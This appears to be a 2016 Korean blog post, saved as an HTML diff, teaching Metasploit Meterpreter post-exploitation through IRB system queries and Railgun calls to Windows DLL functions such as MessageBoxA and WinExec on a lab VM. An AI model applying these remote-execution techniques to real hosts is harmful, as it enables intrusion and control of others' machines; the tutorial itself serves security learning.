@@ -1,0 +1,463 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="color-scheme" content="dark">
+    <meta name="theme-color" content="#040405">
+
+    
+    <title>Meterpreter Railgun! 공격하고 확장하자 🦹🏼 | HAHWUL</title>
+
+    
+    
+        <meta name="description" content="Offensive Security Engineer, Developer and H4cker.">
+    
+
+    
+    <meta property="og:title" content="Meterpreter Railgun! 공격하고 확장하자 🦹🏼">
+  <meta property="og:type" content="article">
+  <meta property="og:url" content="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/blog/2016/metasploit-meterpreter-railgun-useful/">
+  <meta property="og:description" content="Offensive Security Engineer, Developer and H4cker.">
+  <meta property="og:image" content="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/og.png">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Meterpreter Railgun! 공격하고 확장하자 🦹🏼">
+  <meta name="twitter:description" content="Offensive Security Engineer, Developer and H4cker.">
+  <meta name="twitter:image" content="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/og.png">
+    <meta property="og:site_name" content="PIXN">
+    <meta property="og:locale" content="en_US">
+
+    
+    <link rel="canonical" href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/blog/2016/metasploit-meterpreter-railgun-useful/">
+    
+
+    
+    <link rel="alternate" type="application/rss+xml" title="HAHWUL" href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/rss.xml">
+    
+
+    
+    <link rel="icon" type="image/png" href="/favicon.svg" sizes="96x96" />
+    <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
+    <link rel="shortcut icon" href="/favicon.svg" />
+    <link rel="apple-touch-icon" sizes="180x180" href="/favicon.svg" />
+    <meta name="apple-mobile-web-app-title" content="PIXN" />
+    <link rel="manifest" href="/icons/site.webmanifest" />
+
+    
+    <link rel="preload" as="image" href="/images/pixn-mark.svg">
+
+    
+    <link rel="stylesheet" href="/fonts/pretendard/pretendardvariable-dynamic-subset.css">
+
+    
+    <link rel="stylesheet" href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/assets/main.8885b746.css">
+
+    
+    <link rel="stylesheet" href="/assets/css/highlight/atom-one-dark.min.css?v=f44d507f">
+
+    
+    <script type="application/ld+json">{"@context":"https://schema.org","@type":"Article","headline":"Meterpreter Railgun! 공격하고 확장하자 🦹🏼","url":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/blog/2016/metasploit-meterpreter-railgun-useful/","datePublished":"2016-07-18T00:00:00+00:00","dateModified":"2022-10-07T00:00:00+00:00","image":"https://3.bp.blogspot.com/-PKFPzY1I2oI/V40EcUSPmcI/AAAAAAAABrA/9re8SrVODa45GIlRktoflik219ZBQulxwCLcB/s1600/meterpreter.jpg"}</script>
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"HAHWUL","item":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/"},{"@type":"ListItem","position":2,"name":"Archive","item":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/archive/"},{"@type":"ListItem","position":3,"name":"Blog","item":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/blog/"},{"@type":"ListItem","position":4,"name":"Untitled","item":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/blog/2016/"},{"@type":"ListItem","position":5,"name":"Meterpreter Railgun! 공격하고 확장하자 🦹🏼"}]}</script>
+    <script type="application/ld+json">{"@context":"https://schema.org","@type":"WebSite","name":"HAHWUL","url":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/","description":"Offensive Security Engineer, Developer and H4cker.","potentialAction":{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/?q={search_term_string}"},"query-input":"required name=search_term_string"}}</script>
+</head>
+
+<body>
+    <a class="skip-link sr-only" href="#main-content">Skip to content</a>
+    <div class="site-wrapper">
+        <header class="site-header">
+            <div class="header-content">
+                <nav class="main-nav">
+    <div class="nav-logo">
+        <a href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/" aria-label="PIXN, home">
+            <span class="hw-mark" aria-hidden="true"></span>
+            <span class="nav-wordmark" aria-hidden="true">PIXN</span>
+        </a>
+    </div>
+
+    <button class="nav-toggle" aria-label="Toggle navigation" aria-expanded="false" aria-controls="nav-menu">
+        <span></span>
+        <span></span>
+        <span></span>
+    </button>
+
+    <div class="nav-overlay"></div>
+
+    <div class="nav-menu" id="nav-menu">
+        <a href="/posts/">Posts</a>
+        <a href="/notes/">Notes</a>
+        <a href="/projects/">Projects</a>
+        <a href="/about/">About</a>
+    </div>
+
+    <button class="nav-search" type="button" data-search-trigger aria-label="Open search">
+        <span class="nav-search-key" data-search-key aria-hidden="true">⌘K</span>
+    </button>
+</nav>
+
+<script>
+(function() {
+    const navToggle = document.querySelector('.nav-toggle');
+    const navMenu = document.querySelector('.nav-menu');
+    const navOverlay = document.querySelector('.nav-overlay');
+    const body = document.body;
+
+    function openMenu() {
+        navToggle.setAttribute('aria-expanded', 'true');
+        navToggle.classList.add('active');
+        navMenu.classList.add('active');
+        navOverlay.classList.add('active');
+        body.classList.add('nav-open');
+    }
+
+    function closeMenu() {
+        navToggle.setAttribute('aria-expanded', 'false');
+        navToggle.classList.remove('active');
+        navMenu.classList.remove('active');
+        navOverlay.classList.remove('active');
+        body.classList.remove('nav-open');
+    }
+
+    if (navToggle && navMenu) {
+        navToggle.addEventListener('click', function() {
+            const isExpanded = navToggle.getAttribute('aria-expanded') === 'true';
+            if (isExpanded) {
+                closeMenu();
+            } else {
+                openMenu();
+            }
+        });
+
+        // Close menu when clicking overlay
+        if (navOverlay) {
+            navOverlay.addEventListener('click', closeMenu);
+        }
+
+        // Close menu when clicking a link
+        navMenu.querySelectorAll('a').forEach(function(link) {
+            link.addEventListener('click', closeMenu);
+        });
+
+        // Close menu on escape key
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Escape') {
+                closeMenu();
+            }
+        });
+    }
+})();
+</script>
+            </div>
+        </header>
+
+        <main id="main-content">
+            <div class="container">
+                
+
+<div class="post-wrapper">
+    <article class="post-content">
+        <header class="page-header">
+            <h1 class="page-title">Meterpreter Railgun! 공격하고 확장하자 🦹🏼</h1>
+            <div class="post-meta-section">
+                <div class="post-meta">
+                    
+                    <time class="meta-item" datetime="2016-07-18">
+                        JULY 18, 2016
+                    </time>
+                     
+                </div>
+            </div>
+
+            
+            <p class="page-description">Offensive Security Engineer, Developer and H4cker.</p>
+            
+        </header>
+
+        <div class="post-body"><p>오늘은 Metasploit 의 강력한 쉘인 Meterpreter shell 중 Railgun과 IRB를 이용한 API 사용에 대한 내용을 준비했습니다.</p>
+<p>쉬운 이해를 위해서 API Call 먼저보고 RailGun 순서로 진행됩니다. Meterpreter를 아주 강력하게 만들어주는 RailGun, 편리한 공격을 위한 IRB API에 대해 시작합니다. :)</p>
+<h2 id="warm-up">Warm-up!</h2>
+<p>오늘도 meterpreter 테스트를 위해 가상머신 하나를 탈취합니다.
+(VM이라 동일 IP로 찍혀요)</p>
+<pre><code>hahwul exploit(handler) #&gt;
+[*] Sending stage (957999 bytes) to 192.168.0.8
+[*] Meterpreter session 1 opened (192.168.0.8:4444 -&gt; 192.168.0.8:51270) at 2016-07-18 23:12:21 +0900
+
+hahwul exploit(handler) #&gt; sessions -l
+
+Active sessions
+===============
+
+  Id  Type                   Information                                      Connection
+  --  ----                   -----------                                      ----------
+  1   meterpreter x86/win32  BEGINNER-4CAED9\Administrator @ BEGINNER-4CAED9  192.168.0.8:4444 -&gt; 192.168.0.8:51270 (10.0.2.15)
+
+hahwul exploit(handler) #&gt; sessions -i 1
+[*] Starting interaction with 1...
+
+meterpreter &gt;
+</code></pre>
+<h2 id="irb-in-meterpreter">IRB in Meterpreter</h2>
+<p>Meterpreter shell에선 ruby의 IRB를 사용할 수 있습니다. 이를 통해 동적으로 스크립팅이나 테스팅 등이 가능하며 metasploit 자체가 ruby로 짜여있기 때문에 관련된 함수들을 굉장히 편하게 쓸 수 있죠.</p>
+<pre><code>meterpreter &gt; irb
+[*] Starting IRB shell
+[*] The 'client' variable holds the meterpreter client
+
+&gt;&gt;
+</code></pre>
+<p>IRB 사용은 meterpreter 사용에서 아주 유연함을 주기 때문에 알아두면 좋습니다.</p>
+<h2 id="sys-api-call-with-irb">Sys API Call with IRB</h2>
+<p>먼저 meterpreter에서 열려있는 쉘의 시스템 정보는 이미 Object화 되어 저장되어 있습니다. IRB 상태에서 직접 접근할 수 있기 때문에 아래와 같이 <code>client</code> 를 참조하여 시스템 정보를 얻을 수 있습니다.</p>
+<pre><code class="language-ruby hljs"><span class="hljs-string">?&gt;</span> client
+<span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-comment">#&lt;Session:meterpreter 192.168.0.8:51270 (10.0.2.15) &quot;BEGINNER-4CAED9\Administrator @ BEGINNER-4CAED9&quot;&gt;</span>
+</code></pre>
+<p>client를 보면 연결에 대한 정보가 들어있음을 확인할 수 있죠.</p>
+<p>이제 유용한 API를 하나하나 볼까요?</p>
+<h3 id="sysinfo">sysinfo</h3>
+<p>client.sys.config.sysinfo 에 있는 정보는 타겟 시스템에 대한 정보를 담고 있습니다.</p>
+<pre><code class="language-ruby hljs"><span class="hljs-operator">&gt;&gt;</span> client<span class="hljs-operator">.</span>sys<span class="hljs-operator">.</span>config<span class="hljs-operator">.</span>sysinfo
+<span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-punctuation">{</span><span class="hljs-string">&quot;</span><span class="hljs-string">Computer</span><span class="hljs-string">&quot;</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-string">BEGINNER-4CAED9</span><span class="hljs-string">&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;</span><span class="hljs-string">OS</span><span class="hljs-string">&quot;</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-string">Windows XP (Build 2600, Service Pack 3).</span><span class="hljs-string">&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;</span><span class="hljs-string">Architecture</span><span class="hljs-string">&quot;</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-string">x86</span><span class="hljs-string">&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;</span><span class="hljs-string">System Language</span><span class="hljs-string">&quot;</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-string">ko_KR</span><span class="hljs-string">&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;</span><span class="hljs-string">Domain</span><span class="hljs-string">&quot;</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-string">WORKGROUP</span><span class="hljs-string">&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;</span><span class="hljs-string">Logged On Users</span><span class="hljs-string">&quot;</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span><span class="hljs-number">2</span><span class="hljs-punctuation">}</span>
+</code></pre>
+<p>Computer 이름부터 OS, Domain등등 여러가지 정보가 있네요. 각각의 정보는 Hash 형태로 저장되어 있어서 아래와 같이 각각 키 명을 호출하여 값을 불러올 수 있습니다.</p>
+<pre><code class="language-ruby hljs"><span class="hljs-operator">&gt;&gt;</span> client<span class="hljs-operator">.</span>sys<span class="hljs-operator">.</span>config<span class="hljs-operator">.</span>sysinfo<span class="hljs-operator">[</span><span class="hljs-string">&#39;OS&#39;</span><span class="hljs-operator">]</span>
+<span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-string">&quot;</span><span class="hljs-string">Windows XP (Build 2600, Service Pack 3).</span><span class="hljs-string">&quot;</span>
+<span class="hljs-operator">&gt;&gt;</span> client<span class="hljs-operator">.</span>sys<span class="hljs-operator">.</span>config<span class="hljs-operator">.</span>sysinfo<span class="hljs-operator">[</span><span class="hljs-string">&#39;Domain&#39;</span><span class="hljs-operator">]</span>
+<span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-string">&quot;</span><span class="hljs-string">WORKGROUP</span><span class="hljs-string">&quot;</span>
+<span class="hljs-operator">&gt;&gt;</span>
+</code></pre>
+<h3 id="getuid">getuid</h3>
+<p>sys.config 하단에 있는 getuid는 현재 client로 열린 쉘의 사용자를 가지고 있습니다. 권한이라고 보시면되죠. 이걸 이용해서 meterpreter shell로 접근 획득 후 admin 권한인지 확인하고, 없으면 local exploit 을 찾아서 자동으로 권한 탈취하는 meterpreter shell을 구성할 수도 있을 것 같네요.</p>
+<pre><code class="language-ruby hljs"><span class="hljs-operator">&gt;&gt;</span> client<span class="hljs-operator">.</span>sys<span class="hljs-operator">.</span>config<span class="hljs-operator">.</span>getuid
+<span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-string">&quot;</span><span class="hljs-string">BEGINNER-4CAED9</span><span class="hljs-string">\\</span><span class="hljs-string">Administrator</span><span class="hljs-string">&quot;</span>
+<span class="hljs-operator">&gt;&gt;</span>
+</code></pre>
+<p>local exploit 관련 글은 아래 내용 참조해주세요.</p>
+<blockquote>
+<p><a href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/2016/02/26/metasploit-localexploitsuggester-local/">https://pixn-analytics-portfolio.forhm0220.chatgpt.site/2016/02/26/metasploit-localexploitsuggester-local/</a></p>
+</blockquote>
+<h3 id="interfaces">interfaces</h3>
+<p>마지막으로 ifconfig, ipconfig에 해당하는 net.config 하단의 interfaces 입니다.
+net 아래인 것 처럼 네트워크 정보를 담고 있으며 이 부분도 parsing 해서 사용 시 편리할 것 같습니다.</p>
+<pre><code class="language-ruby hljs"><span class="hljs-operator">&gt;&gt;</span> interface <span class="hljs-operator">=</span> client<span class="hljs-operator">.</span>net<span class="hljs-operator">.</span>config<span class="hljs-operator">.</span>interfaces
+<span class="hljs-operator">&gt;&gt;</span> interface<span class="hljs-operator">.</span>each <span class="hljs-keyword">do</span> <span class="hljs-operator">|</span>i<span class="hljs-operator">|</span>
+<span class="hljs-string">?&gt;</span> <span class="hljs-built_in">puts</span> i<span class="hljs-operator">.</span>pretty
+<span class="hljs-operator">&gt;&gt;</span> <span class="hljs-keyword">end</span>
+<span class="hljs-variable constant_">Interface</span>  <span class="hljs-number">2</span>
+<span class="hljs-operator">===</span><span class="hljs-operator">===</span><span class="hljs-operator">===</span><span class="hljs-operator">===</span>
+<span class="hljs-variable constant_">Name</span>         <span class="hljs-punctuation">:</span> <span class="hljs-variable constant_">AMD</span> <span class="hljs-variable constant_">PCNET</span> <span class="hljs-variable constant_">Family</span> <span class="hljs-variable constant_">PCI</span> <span class="hljs-variable constant_">Ethernet</span> <span class="hljs-variable constant_">Adapter</span> <span class="hljs-operator">-</span> rfacee
+<span class="hljs-variable constant_">Hardware</span> <span class="hljs-variable constant_">MAC</span> <span class="hljs-punctuation">:</span> <span class="hljs-number">08</span><span class="hljs-punctuation">:</span><span class="hljs-number">00</span><span class="hljs-punctuation">:</span><span class="hljs-number">27</span><span class="hljs-punctuation">:</span><span class="hljs-number">14</span><span class="hljs-symbol">:c5</span><span class="hljs-symbol">:a9</span>
+<span class="hljs-variable constant_">MTU</span>          <span class="hljs-punctuation">:</span> <span class="hljs-number">1500</span>
+<span class="hljs-variable constant_">IPv4</span> <span class="hljs-variable constant_">Address</span> <span class="hljs-punctuation">:</span> <span class="hljs-number">10</span><span class="hljs-operator">.</span><span class="hljs-number">0</span><span class="hljs-operator">.</span><span class="hljs-number">2</span><span class="hljs-operator">.</span><span class="hljs-number">15</span>
+<span class="hljs-variable constant_">IPv4</span> <span class="hljs-variable constant_">Netmask</span> <span class="hljs-punctuation">:</span> <span class="hljs-number">255</span><span class="hljs-operator">.</span><span class="hljs-number">255</span><span class="hljs-operator">.</span><span class="hljs-number">255</span><span class="hljs-operator">.</span><span class="hljs-number">0</span>
+<span class="hljs-variable constant_">Interface</span>  <span class="hljs-number">1</span>
+<span class="hljs-operator">===</span><span class="hljs-operator">===</span><span class="hljs-operator">===</span><span class="hljs-operator">===</span>
+<span class="hljs-variable constant_">Name</span>         <span class="hljs-punctuation">:</span> <span class="hljs-variable constant_">MS</span> <span class="hljs-variable constant_">TCP</span> <span class="hljs-variable constant_">Loopback</span> interface
+<span class="hljs-variable constant_">Hardware</span> <span class="hljs-variable constant_">MAC</span> <span class="hljs-punctuation">:</span> <span class="hljs-number">00</span><span class="hljs-punctuation">:</span><span class="hljs-number">00</span><span class="hljs-punctuation">:</span><span class="hljs-number">00</span><span class="hljs-punctuation">:</span><span class="hljs-number">00</span><span class="hljs-punctuation">:</span><span class="hljs-number">00</span><span class="hljs-punctuation">:</span><span class="hljs-number">00</span>
+<span class="hljs-variable constant_">MTU</span>          <span class="hljs-punctuation">:</span> <span class="hljs-number">1520</span>
+<span class="hljs-variable constant_">IPv4</span> <span class="hljs-variable constant_">Address</span> <span class="hljs-punctuation">:</span> <span class="hljs-number">127</span><span class="hljs-operator">.</span><span class="hljs-number">0</span><span class="hljs-operator">.</span><span class="hljs-number">0</span><span class="hljs-operator">.</span><span class="hljs-number">1</span>
+</code></pre>
+<h2 id="meterpreter-railgun">Meterpreter RailGun</h2>
+<p>Meterpreter에선 Railgun 이란 기능을 제공하고 있습니다. RailGun은 Meterpreter shell이 침투한 Windows에서 동작할 때 사용할 수 있는 확장부분입니다. Target system에 존재하는 DLL과 그 내부의 함수, 코드등에 대해 실행할 수 있어 공격자로 하여금 좀 더 유연한 공격과 편리한 기능을 제공합니다.</p>
+<p><img loading="lazy" src="https://3.bp.blogspot.com/-0dviJdhhjB8/V40CoUdyA1I/AAAAAAAABqw/NWgtE8Aqn-0kRF6A7KSoO3rUhKM_dfhZwCLcB/s1600/Railgun-transformers.jpg" alt="" /></p>
+<p>Railgun은 meterpreter shell의 IRB에서 <code>client.railgun</code> 으로 호출하여 사용할 수 있습니다. POST Extploit Script를 작성하셔도 동일한 형태로 사용하실 수 있습니다.</p>
+<p>다만 예쁜 help를 주는건 아니니 각 DLL 별 함수 종류 및 사용법을 위해서는 MSDN은 필수입니다.</p>
+<h3 id="using-user32dll-fucntion">Using USER32.DLL fucntion</h3>
+<p>아까 irb의 구조를 조금 보았기 때문에 아마도 이해에 도움되실겁니다 <code>client</code> 하단에 railgun이 따로 존재하며 위에서 말씀드렸듯이 railgun을 이용해서 system api 를 직접 호출할 수 있습니다.</p>
+<p>일단 사용법을 보면 아래와 같습니다.</p>
+<pre><code class="language-ruby hljs">client<span class="hljs-operator">.</span>railgun<span class="hljs-operator">.</span><span class="hljs-operator">&lt;</span>dll library<span class="hljs-operator">&gt;</span><span class="hljs-operator">.</span><span class="hljs-operator">&lt;</span>function<span class="hljs-operator">&gt;</span><span class="hljs-punctuation">(</span><span class="hljs-operator">&lt;</span>function args<span class="hljs-operator">&gt;</span><span class="hljs-punctuation">)</span>
+</code></pre>
+<p>railgun 하단에 사용할 dll library가 들어가고 dll의 존재하는 함수명으로 호출이 간으합니다. 좀 더 쉬운 이해를 위해 아래 예제 코드를 볼까요?</p>
+<pre><code class="language-ruby hljs">client<span class="hljs-operator">.</span>railgun<span class="hljs-operator">.</span>user32<span class="hljs-operator">.</span>MessageBoxA<span class="hljs-punctuation">(</span><span class="hljs-number">0</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;</span><span class="hljs-string">HAHWUL</span><span class="hljs-string">&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;</span><span class="hljs-string">HAcked.!</span><span class="hljs-string">&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;</span><span class="hljs-string">MB_OK</span><span class="hljs-string">&quot;</span><span class="hljs-punctuation">)</span>
+</code></pre>
+<p>railgun으로 <code>user32.dll</code>에 접근 후 <code>MessageBoxA</code> 함수를 실행합니다. <code>MessageBoxA</code> 함수는 Win API 프로그래밍을 해보셨다면 많이 익숙할껍니다. 바로 메시지 창이죠.</p>
+<pre><code class="language-c hljs"><span class="hljs-type">int</span> WINAPI <span class="hljs-title function_">MessageBox</span><span class="hljs-punctuation">(</span>
+  _In_opt_ HWND    hWnd<span class="hljs-punctuation">,</span>
+  _In_opt_ LPCTSTR lpText<span class="hljs-punctuation">,</span>
+  _In_opt_ LPCTSTR lpCaption<span class="hljs-punctuation">,</span>
+  _In_     UINT    uType
+<span class="hljs-punctuation">)</span><span class="hljs-punctuation">;</span>
+</code></pre>
+<p>위 값을 입력했을 때 Target PC에서 어떤일이 일어나는지 보죠.</p>
+<p><img loading="lazy" src="https://3.bp.blogspot.com/-INo6NFTypJc/V40BvdxpSQI/AAAAAAAABqk/aPl9SdU8_N0cEEBtEXZEWrFSjfoS66pIwCLcB/s1600/1.png" alt="" /></p>
+<p><code>user32.dll</code>에 선언된 <code>MessageBoxA</code> 함수가 실행되어 제가 넣은 인자값으로 창이 뜨게 되었습니다. 사용 가능한 함수 리스트는 puts으로 찍어주면 쉽게 볼 수 있습니다.</p>
+<pre><code class="language-ruby hljs"><span class="hljs-built_in">puts</span> client<span class="hljs-operator">.</span>railgun<span class="hljs-operator">.</span>user32
+<span class="hljs-symbol">RuntimeError</span><span class="hljs-punctuation">:</span> <span class="hljs-variable constant_">DLL</span><span class="hljs-operator">-</span>function to_ary <span class="hljs-keyword">not</span> found<span class="hljs-operator">.</span> <span class="hljs-variable constant_">Known</span> <span class="hljs-symbol">functions</span><span class="hljs-punctuation">:</span> <span class="hljs-operator">[</span><span class="hljs-string">&quot;</span><span class="hljs-string">ActivateKeyboardLayout</span><span class="hljs-string">&quot;</span><span class="hljs-punctuation">,</span>
+ <span class="hljs-string">&quot;</span><span class="hljs-string">AdjustWindowRect</span><span class="hljs-string">&quot;</span><span class="hljs-punctuation">,</span>
+ <span class="hljs-string">&quot;</span><span class="hljs-string">AdjustWindowRectEx</span><span class="hljs-string">&quot;</span><span class="hljs-punctuation">,</span>
+ <span class="hljs-string">&quot;</span><span class="hljs-string">AllowSetForegroundWindow</span><span class="hljs-string">&quot;</span><span class="hljs-punctuation">,</span>
+<span class="hljs-comment"># ...</span>
+</code></pre>
+<h3 id="using-kernel32dll-fucntion">Using KERNEL32.DLL fucntion</h3>
+<p>자 그럼 하나 더 해볼까요? kernel32.dll에는 WinExec 라는 함수가 있습니다. 명령을 실행시켜주죠. (간단한 함수로 찾다보니 WinExec가 설명하기 좋겠더라구요)</p>
+<p>함수형을 보면 아래와 같습니다.</p>
+<pre><code class="language-c hljs">UINT WINAPI <span class="hljs-title function_">WinExec</span><span class="hljs-punctuation">(</span>
+  _In_ LPCSTR lpCmdLine<span class="hljs-punctuation">,</span>
+  _In_ UINT   uCmdShow
+<span class="hljs-punctuation">)</span><span class="hljs-punctuation">;</span>
+</code></pre>
+<p>첫번째째인자값으로 명령, 두번째는 view 옵션이 들어갑니다. 이제 railgun으로 실행해볼까요?</p>
+<pre><code class="language-ruby hljs">client<span class="hljs-operator">.</span>railgun<span class="hljs-operator">.</span>kernel32<span class="hljs-operator">.</span>WinExec<span class="hljs-punctuation">(</span><span class="hljs-string">&quot;</span><span class="hljs-string">calc</span><span class="hljs-string">&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-number">0</span><span class="hljs-punctuation">)</span>
+<span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-punctuation">{</span><span class="hljs-string">&quot;</span><span class="hljs-string">GetLastError</span><span class="hljs-string">&quot;</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span><span class="hljs-number">0</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;</span><span class="hljs-string">ErrorMessage</span><span class="hljs-string">&quot;</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span><span class="hljs-string">&quot;</span><span class="hljs-string">\xC0</span><span class="hljs-string">\xDB</span><span class="hljs-string">\xBE</span><span class="hljs-string">\xF7</span><span class="hljs-string">\xC0</span><span class="hljs-string">\xBB</span><span class="hljs-string"> </span><span class="hljs-string">\xBF</span><span class="hljs-string">\xCF</span><span class="hljs-string">\xB7</span><span class="hljs-string">\xE1</span><span class="hljs-string">\xC7</span><span class="hljs-string">\xDF</span><span class="hljs-string">\xBD</span><span class="hljs-string">\xC0</span><span class="hljs-string">\xB4</span><span class="hljs-string">\xCF</span><span class="hljs-string">\xB4</span><span class="hljs-string">\xD9</span><span class="hljs-string">.</span><span class="hljs-string">&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;</span><span class="hljs-string">return</span><span class="hljs-string">&quot;</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span><span class="hljs-number">33</span><span class="hljs-punctuation">}</span>
+</code></pre>
+<p><img loading="lazy" src="https://2.bp.blogspot.com/-5ij5uQqsu-4/V40BzXoDeeI/AAAAAAAABqo/Hhi6og7EI7IgZp2eQsOuFYwnll-74oKGQCLcB/s1600/2.png" alt="" /></p>
+<p>계산기가 잘 뜨네요.</p>
+<h2 id="conclusion">Conclusion</h2>
+<p>Railgun은 아주 좋은 Ruby Module 입니다. 탈취한 세션에서 작업을 하는 경우 기본 shell, meterpreter 로만은 불편한 부분이 있는데 이를 코드단에서 지원함으로써 공격자가 쉽게 확장하고 사용할 수 있어집니다. 그리고 ruby 자체로 코딩할 수 있으니 그 가능성은 무한하다고 봅니다.</p>
+<h2 id="reference">Reference</h2>
+<ul>
+<li><a href="https://www.offensive-security.com/metasploit-unleashed/api-calls/">https://www.offensive-security.com/metasploit-unleashed/api-calls/</a></li>
+<li><a href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/2015/08/17/metasploit-metasploit-autorunscript/">https://pixn-analytics-portfolio.forhm0220.chatgpt.site/2015/08/17/metasploit-metasploit-autorunscript/</a></li>
+<li><a href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/2016/02/26/metasploit-localexploitsuggester-local/">https://pixn-analytics-portfolio.forhm0220.chatgpt.site/2016/02/26/metasploit-localexploitsuggester-local/</a></li>
+<li><a href="https://msdn.microsoft.com/ko-kr/library/windows/desktop/ms687393(v=vs.85).aspx">https://msdn.microsoft.com/ko-kr/library/windows/desktop/ms687393(v=vs.85).aspx</a></li>
+<li><a href="https://msdn.microsoft.com/ko-kr/library/windows/desktop/ms645505(v=vs.85).aspx">https://msdn.microsoft.com/ko-kr/library/windows/desktop/ms645505(v=vs.85).aspx</a></li>
+</ul>
+</div>
+
+        <div class="footnotes-area"></div>
+
+        
+            
+            
+                
+                
+                
+                
+                
+                
+                
+                
+            
+        
+    </article>
+
+    
+</div>
+
+            </div>
+        </main>
+
+        <footer class="site-footer">
+    <div class="container">
+        <div class="footer-content">
+            <span class="hw-mark footer-mark" aria-hidden="true"></span>
+            <nav class="footer-menu" aria-label="Footer">
+                <a href="/tags/">TAGS</a>
+                <a href="/about/uses/">USES</a>
+                <a href="/contact/">CONTACT</a>
+                <a href="/feeds/">FEEDS</a>
+                <a href="/privacy/">PRIVACY</a>
+            </nav>
+            <div class="socials">
+                <a
+                    href="https://github.com/hahwul"
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    title="GitHub"
+                    aria-label="GitHub"
+                    ><svg
+                        aria-hidden="true"
+                        fill="currentColor"
+                        xmlns="http://www.w3.org/2000/svg"
+                        viewBox="0 0 24 24"
+                    >
+                        <path
+                            d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"
+                        /></svg
+                ></a>
+                <a
+                    href="https://x.com/hahwul"
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    title="X"
+                    aria-label="X (Twitter)"
+                    ><svg
+                        aria-hidden="true"
+                        fill="currentColor"
+                        xmlns="http://www.w3.org/2000/svg"
+                        viewBox="0 0 24 24"
+                    >
+                        <path
+                            d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"
+                        /></svg
+                ></a>
+                <a
+                    href="https://www.instagram.com/hahwul_"
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    title="Instagram"
+                    aria-label="Instagram"
+                    ><svg
+                        aria-hidden="true"
+                        fill="currentColor"
+                        xmlns="http://www.w3.org/2000/svg"
+                        viewBox="0 0 24 24"
+                    >
+                        <path
